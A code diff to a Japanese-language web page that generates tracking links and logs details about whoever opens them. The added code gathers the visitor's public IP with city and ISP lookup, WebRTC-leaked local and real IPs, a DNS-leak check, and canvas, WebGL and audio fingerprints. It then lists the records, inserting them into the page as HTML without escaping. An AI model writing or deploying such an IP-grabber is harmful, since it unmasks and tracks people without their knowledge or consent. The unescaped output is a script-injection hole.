@@ -195,7 +195,7 @@
         
         .detail-row {
             display: grid;
-            grid-template-columns: 150px 1fr;
+            grid-template-columns: 180px 1fr;
             gap: 10px;
             margin-bottom: 10px;
         }
@@ -208,6 +208,7 @@
         .detail-value {
             color: #fff;
             font-family: 'Courier New', monospace;
+            word-break: break-all;
         }
         
         .completed-page {
@@ -235,6 +236,12 @@
             border-radius: 8px;
             margin-top: 20px;
             display: none;
+        }
+        
+        @media (max-width: 768px) {
+            .detail-row {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
@@ -305,6 +312,9 @@
             
             showStatus('リンクが作成されました！');
             
+            // 初回ロード
+            loadVisitors();
+            
             // 訪問者情報の定期チェック開始
             if (checkInterval) clearInterval(checkInterval);
             checkInterval = setInterval(() => loadVisitors(), 2000);
@@ -314,6 +324,8 @@
             const link = document.getElementById('generated-link').textContent;
             navigator.clipboard.writeText(link).then(() => {
                 showStatus('リンクをコピーしました！');
+            }).catch(() => {
+                showStatus('コピーに失敗しました');
             });
         }
         
@@ -341,34 +353,39 @@
                 const visitorData = {
                     linkId: linkId,
                     timestamp: new Date().toISOString(),
-                    publicIP: publicIP,
-                    localIPs: localIPs,
-                    webRTCIPs: webRTCIPs,
-                    dnsServers: dnsLeak,
-                    ipInfo: advancedIP,
-                    userAgent: navigator.userAgent,
-                    browser: getBrowser(),
-                    os: getOS(),
+                    publicIP: publicIP || '取得失敗',
+                    localIPs: localIPs || [],
+                    webRTCIPs: webRTCIPs || [],
+                    dnsServers: dnsLeak || '取得失敗',
+                    ipInfo: advancedIP || '取得失敗',
+                    userAgent: navigator.userAgent || '不明',
+                    browser: getBrowser() || '不明',
+                    os: getOS() || '不明',
                     screenResolution: `${screen.width}x${screen.height}`,
                     deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '不明',
-                    language: navigator.language,
-                    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language || '不明',
+                    languages: navigator.languages ? navigator.languages.join(', ') : (navigator.language || '不明'),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '不明',
                     timezoneOffset: new Date().getTimezoneOffset(),
-                    platform: navigator.platform,
-                    connection: getConnectionInfo(),
+                    platform: navigator.platform || '不明',
+                    connection: getConnectionInfo() || '不明',
                     hardwareConcurrency: navigator.hardwareConcurrency || '不明',
                     doNotTrack: navigator.doNotTrack || '不明',
-                    cookieEnabled: navigator.cookieEnabled,
-                    plugins: getPlugins(),
-                    canvas: getCanvasFingerprint(),
-                    webGL: getWebGLFingerprint(),
-                    audio: await getAudioFingerprint()
+                    cookieEnabled: navigator.cookieEnabled ? 'はい' : 'いいえ',
+                    plugins: getPlugins() || 'なし',
+                    canvas: getCanvasFingerprint() || '取得失敗',
+                    webGL: getWebGLFingerprint() || '取得失敗',
+                    audio: await getAudioFingerprint() || '取得失敗'
                 };
                 
                 // LocalStorageに保存
                 const storageKey = `visitors_${linkId}`;
-                let visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
+                let visitors = [];
+                try {
+                    visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
+                } catch (e) {
+                    visitors = [];
+                }
                 visitors.push(visitorData);
                 localStorage.setItem(storageKey, JSON.stringify(visitors));
                 
@@ -383,9 +400,16 @@
             if (!linkId) return;
             
             const storageKey = `visitors_${linkId}`;
-            const visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
+            let visitors = [];
+            try {
+                visitors = JSON.parse(localStorage.getItem(storageKey) || '[]');
+            } catch (e) {
+                visitors = [];
+            }
             
             const listEl = document.getElementById('visitors-list');
+            if (!listEl) return;
+            
             listEl.innerHTML = '';
             
             if (visitors.length === 0) {
@@ -422,7 +446,19 @@
                         </div>
                         <div class="detail-row">
                             <div class="detail-label">ローカルIP:</div>
-                            <div class="detail-value">${visitor.localIPs.length > 0 ? visitor.localIPs.join(', ') : '取得失敗'}</div>
+                            <div class="detail-value">${visitor.localIPs && visitor.localIPs.length > 0 ? visitor.localIPs.join(', ') : '取得失敗'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">WebRTC IP:</div>
+                            <div class="detail-value">${visitor.webRTCIPs && visitor.webRTCIPs.length > 0 ? visitor.webRTCIPs.join(', ') : '取得失敗'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">DNS情報:</div>
+                            <div class="detail-value">${visitor.dnsServers || '取得失敗'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">IP詳細情報:</div>
+                            <div class="detail-value">${visitor.ipInfo || '取得失敗'}</div>
                         </div>
                         <div class="detail-row">
                             <div class="detail-label">OS:</div>
@@ -445,12 +481,44 @@
                             <div class="detail-value">${visitor.language}</div>
                         </div>
                         <div class="detail-row">
+                            <div class="detail-label">対応言語:</div>
+                            <div class="detail-value">${visitor.languages || visitor.language}</div>
+                        </div>
+                        <div class="detail-row">
                             <div class="detail-label">タイムゾーン:</div>
-                            <div class="detail-value">${visitor.timezone}</div>
+                            <div class="detail-value">${visitor.timezone} (${visitor.timezoneOffset || '不明'}分)</div>
                         </div>
                         <div class="detail-row">
                             <div class="detail-label">プラットフォーム:</div>
                             <div class="detail-value">${visitor.platform}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">CPU コア数:</div>
+                            <div class="detail-value">${visitor.hardwareConcurrency || '不明'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">DNT設定:</div>
+                            <div class="detail-value">${visitor.doNotTrack || '不明'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">Cookie有効:</div>
+                            <div class="detail-value">${visitor.cookieEnabled || '不明'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">プラグイン:</div>
+                            <div class="detail-value">${visitor.plugins || 'なし'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">Canvas指紋:</div>
+                            <div class="detail-value">${visitor.canvas || '不明'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">WebGL指紋:</div>
+                            <div class="detail-value">${visitor.webGL || '不明'}</div>
+                        </div>
+                        <div class="detail-row">
+                            <div class="detail-label">Audio指紋:</div>
+                            <div class="detail-value">${visitor.audio || '不明'}</div>
                         </div>
                         <div class="detail-row">
                             <div class="detail-label">接続情報:</div>
@@ -458,14 +526,16 @@
                         </div>
                         <div class="detail-row">
                             <div class="detail-label">ユーザーエージェント:</div>
-                            <div class="detail-value">${visitor.userAgent}</div>
+                            <div class="detail-value">${visitor.userAgent || '不明'}</div>
                         </div>
                     </div>
                 `;
                 
-                item.addEventListener('click', () => {
+                item.addEventListener('click', function() {
                     const details = document.getElementById(`details-${index}`);
-                    details.style.display = details.style.display === 'block' ? 'none' : 'block';
+                    if (details) {
+                        details.style.display = details.style.display === 'block' ? 'none' : 'block';
+                    }
                 });
                 
                 listEl.appendChild(item);
@@ -476,7 +546,7 @@
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                return data.ip;
+                return data.ip || '取得失敗';
             } catch (error) {
                 return '取得失敗';
             }
@@ -488,7 +558,7 @@
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 
                 pc.createDataChannel("");
-                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+                pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => {});
                 
                 pc.onicecandidate = (ice) => {
                     if (!ice || !ice.candidate || !ice.candidate.candidate) return;
@@ -507,37 +577,221 @@
                 };
                 
                 setTimeout(() => {
-                    pc.close();
+                    try { pc.close(); } catch(e) {}
                     resolve(Array.from(ips));
                 }, 3000);
             });
         }
         
         function getOS() {
-            const userAgent = navigator.userAgent;
-            if (/Windows/.test(userAgent)) return "Windows";
-            if (/Macintosh/.test(userAgent)) return "Mac OS";
-            if (/Linux/.test(userAgent)) return "Linux";
-            if (/Android/.test(userAgent)) return "Android";
-            if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return "iOS";
-            return "Unknown OS";
+            try {
+                const userAgent = navigator.userAgent;
+                if (/Windows/.test(userAgent)) return "Windows";
+                if (/Macintosh/.test(userAgent)) return "Mac OS";
+                if (/Linux/.test(userAgent)) return "Linux";
+                if (/Android/.test(userAgent)) return "Android";
+                if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return "iOS";
+                return "Unknown OS";
+            } catch (e) {
+                return "不明";
+            }
         }
         
         function getBrowser() {
-            const userAgent = navigator.userAgent;
-            if (/Edg/.test(userAgent)) return "Microsoft Edge";
-            if (/Chrome/.test(userAgent)) return "Google Chrome";
-            if (/Firefox/.test(userAgent)) return "Mozilla Firefox";
-            if (/Safari/.test(userAgent)) return "Safari";
-            if (/Opera|OPR/.test(userAgent)) return "Opera";
-            return "Unknown Browser";
+            try {
+                const userAgent = navigator.userAgent;
+                if (/Edg/.test(userAgent)) return "Microsoft Edge";
+                if (/Chrome/.test(userAgent)) return "Google Chrome";
+                if (/Firefox/.test(userAgent)) return "Mozilla Firefox";
+                if (/Safari/.test(userAgent)) return "Safari";
+                if (/Opera|OPR/.test(userAgent)) return "Opera";
+                return "Unknown Browser";
+            } catch (e) {
+                return "不明";
+            }
         }
         
         function getConnectionInfo() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return '不明';
-            
-            return `${conn.effectiveType || '不明'} (下り: ${conn.downlink || '不明'} Mbps, RTT: ${conn.rtt || '不明'} ms)`;
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!conn) return '不明';
+                
+                return `${conn.effectiveType || '不明'} (下り: ${conn.downlink || '不明'} Mbps, RTT: ${conn.rtt || '不明'} ms)`;
+            } catch (e) {
+                return '不明';
+            }
+        }
+        
+        async function getAdvancedIPInfo(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return `${data.country_name || '不明'}, ${data.city || '不明'}, ISP: ${data.org || '不明'}`;
+            } catch (error) {
+                return '取得失敗';
+            }
+        }
+        
+        async function getWebRTCIPs() {
+            return new Promise(resolve => {
+                const ips = new Set();
+                const pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: 'stun:stun.l.google.com:19302' },
+                        { urls: 'stun:stun1.l.google.com:19302' },
+                        { urls: 'stun:stun2.l.google.com:19302' },
+                        { urls: 'stun:stun.services.mozilla.com' }
+                    ]
+                });
+                
+                pc.createDataChannel("");
+                pc.createOffer().then(sdp => pc.setLocalDescription(sdp)).catch(() => {});
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    
+                    try {
+                        const candidateStr = ice.candidate.candidate;
+                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+                        const ipMatch = candidateStr.match(ipRegex);
+                        
+                        if (ipMatch) {
+                            const ip = ipMatch[0];
+                            if (!ip.startsWith("0.") && !ip.startsWith("127.")) {
+                                ips.add(ip);
+                            }
+                        }
+                    } catch (e) {}
+                };
+                
+                setTimeout(() => {
+                    try { pc.close(); } catch(e) {}
+                    resolve(Array.from(ips));
+                }, 5000);
+            });
+        }
+        
+        async function checkDNSLeak() {
+            try {
+                const response = await fetch('https://1.1.1.1/cdn-cgi/trace');
+                const text = await response.text();
+                const lines = text.split('\n');
+                const dnsInfo = {};
+                lines.forEach(line => {
+                    const [key, value] = line.split('=');
+                    if (key && value) dnsInfo[key.trim()] = value.trim();
+                });
+                return `IP: ${dnsInfo.ip || '不明'}, Loc: ${dnsInfo.loc || '不明'}`;
+            } catch (error) {
+                return '取得失敗';
+            }
+        }
+        
+        function getPlugins() {
+            try {
+                if (!navigator.plugins || navigator.plugins.length === 0) {
+                    return 'なし';
+                }
+                const plugins = [];
+                for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                return plugins.join(', ');
+            } catch (e) {
+                return 'なし';
+            }
+        }
+        
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const text = 'fingerprint123!@#$%^&*()';
+                ctx.textBaseline = 'top';
+                ctx.font = '14px "Arial"';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText(text, 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText(text, 4, 17);
+                const dataURL = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < dataURL.length; i++) {
+                    const char = dataURL.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                return hash.toString(16);
+            } catch (error) {
+                return '取得失敗';
+            }
+        }
+        
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'WebGL非対応';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    return `${vendor} - ${renderer}`;
+                }
+                return 'WebGL情報取得不可';
+            } catch (error) {
+                return '取得失敗';
+            }
+        }
+        
+        async function getAudioFingerprint() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return 'Audio非対応';
+                
+                const context = new AudioContext();
+                const oscillator = context.createOscillator();
+                const analyser = context.createAnalyser();
+                const gainNode = context.createGain();
+                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+                
+                gainNode.gain.value = 0;
+                oscillator.type = 'triangle';
+                oscillator.connect(analyser);
+                analyser.connect(scriptProcessor);
+                scriptProcessor.connect(gainNode);
+                gainNode.connect(context.destination);
+                
+                oscillator.start(0);
+                
+                return new Promise(resolve => {
+                    scriptProcessor.onaudioprocess = function(event) {
+                        const output = event.outputBuffer.getChannelData(0);
+                        let hash = 0;
+                        for (let i = 0; i < output.length; i++) {
+                            hash += Math.abs(output[i]);
+                        }
+                        try {
+                            oscillator.stop();
+                            context.close();
+                        } catch(e) {}
+                        resolve(hash.toFixed(10));
+                    };
+                    
+                    setTimeout(() => {
+                        resolve('タイムアウト');
+                        try { 
+                            oscillator.stop(); 
+                            context.close(); 
+                        } catch(e) {}
+                    }, 1000);
+                });
+            } catch (error) {
+                return '取得失敗';
+            }
         }
     </script>
 </body>
